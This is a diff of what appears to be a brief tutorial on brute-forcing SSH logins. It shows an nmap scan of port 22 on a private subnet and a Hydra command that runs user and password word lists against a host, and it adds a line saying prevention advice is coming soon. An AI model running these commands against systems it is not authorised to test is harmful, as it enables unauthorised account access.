@@ -7,9 +7,11 @@ ex: nmap -p 22 -open -sV 192.168.2.0/24
 -sV attempts to display ssh version
 
 2)Attack the user using Hydra
-ex: hydra -V -L userList.txt -P passwordList.txt -t 16 192.168.2.10
+ex: hydra -V -L userList.txt -P passwordList.txt -t 16 192.168.2.10 ssh
 -V specifies verbose (shows username and password being attempted)
 -L user word list. use -l for username
 -P password list
 -t Threads. upto 32
 
+
+How to prevent from such attack will be comming soon for firewalld and iptables
